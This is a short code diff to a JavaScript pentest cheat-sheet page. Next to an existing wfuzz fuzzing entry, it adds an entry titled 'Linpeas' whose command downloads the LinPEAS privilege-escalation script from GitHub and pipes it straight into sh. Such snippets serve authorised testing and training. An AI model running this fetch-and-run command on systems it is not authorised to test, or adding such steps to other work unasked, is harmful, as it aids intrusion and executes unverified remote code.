@@ -137,7 +137,10 @@
           title: "WFUZZ {Medium Files.}",
           text: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 $URL"
         },
-     
+         {
+          title: "Linpeas",
+          text: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        },
       ];
 
       const form = document.querySelector('form');
